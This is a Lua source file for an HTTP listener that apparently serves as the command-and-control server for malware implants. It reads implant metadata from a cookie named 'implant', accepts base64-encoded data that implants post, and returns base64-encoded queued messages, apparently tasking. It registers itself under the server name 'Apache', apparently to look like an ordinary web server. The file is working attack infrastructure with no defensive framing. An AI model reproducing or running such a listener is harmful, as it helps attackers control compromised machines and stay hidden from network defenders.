local httpd = require "httpd"
local copas = require "copas"
local string = require "string"
local url = require "socket.url"
local mime = require "mime"
local listener = require "listener"
local messages = require "messages"

if #arg ~= 2 then
    error("Expecting 2 arguments, got " .. #arg)
end

local address = arg[1]
local port = arg[2]

local function parse_cookies(req, name)
    local cookies = req.headers["cookie"] or ""
    cookies = ";" .. cookies .. ";"
    cookies = string.gsub(cookies, "%s*;%s*", ";")   -- remove extra spaces
    local pattern = ";" .. name .. "=(.-);"
    local _, __, value = string.find(cookies, pattern)
    if value then
        value = url.unescape(value)
    end
    return value
end

local function handle_request(req, res)
    if req.cmd_mth == "POST" then
        if req.relpath == "/" then
            local metadata = parse_cookies(req, "implant")
            if metadata ~= nil and metadata ~= "" then
                metadata = mime.unb64(metadata)
                if req.content then
                    local data = mime.unb64(req.content)
                    if data == nil then data = "" end
                    if messages.submit(metadata, data) then
                        success, data = messages.retrieve(metadata)
                        if success then
                            if data then
                                res.headers["Content-Type"] = "text/plain"
                                res.content = mime.b64(data)
                            end
                            return res
                        end
                        return httpd.err_400(req, res)
                    end
                end
            end
            return httpd.err_400(req, res)
        end
        return httpd.err_404(req, res)
    end
    return httpd.err_405(req, res)
end

httpd.handle_request = handle_request
httpd.register(address, port, "Apache")

while listener.run() do
    copas.step(1)
end
